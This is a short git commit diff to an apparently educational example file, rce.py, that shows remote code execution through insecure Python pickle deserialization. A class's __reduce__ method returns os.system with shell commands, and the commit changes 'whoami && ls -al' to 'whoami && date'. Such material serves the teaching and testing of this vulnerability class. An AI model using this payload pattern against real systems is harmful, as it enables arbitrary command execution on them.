3e43eaf5d02517ced6469cea21cb74d391545072
Naveen J <nvnj1998@gmail.com>
2021-06-08 13:22:59 +0530

    Update rce.py

--- Insecure_Deserialization/Examples/python/pickle/rce.py
+++ Insecure_Deserialization/Examples/python/pickle/rce.py
@@ -3,7 +3,7 @@ import pickle
 class hello:
 	def __reduce__(self):
 		import os
-		return (os.system, ('whoami && ls -al',))
+		return (os.system, ('whoami && date',))
 
 # Serialization
 print("lets begin the Serialization")
